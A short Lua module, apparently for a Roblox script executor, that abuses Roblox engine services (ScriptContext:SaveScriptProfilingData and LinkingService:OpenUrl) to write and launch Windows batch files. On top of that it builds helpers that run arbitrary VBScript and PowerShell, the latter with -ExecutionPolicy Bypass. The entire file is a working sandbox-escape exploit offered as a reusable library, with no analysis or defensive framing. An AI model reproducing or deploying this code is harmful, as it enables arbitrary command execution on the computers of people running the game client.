local secment = {}

function secment.bat(code)
    local name = math.random(100000, 999999)
    local batContent = [[
@echo off
]] .. code .. [[
]]
    local batFileName = tostring(name) .. ".bat"
    game:GetService("LinkingService"):OpenUrl(game:GetService("ScriptContext"):SaveScriptProfilingData(batContent, batFileName))
end

function secment.vbs(code)
    secment.bat([[ 
@echo off
setlocal

(
echo ]] .. code .. [[
) > temp_script.vbs

cscript //nologo temp_script.vbs
del temp_script.vbs
]])
end

function secment.powershell(code)
    secment.bat([[Powershell.exe -ExecutionPolicy Bypass -Command "]] .. code .. [[" & del temp_script.ps1]])
end

function secment.msgbox(message)
    secment.powershell([[Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(']] .. message .. [[')]])
end

return secment
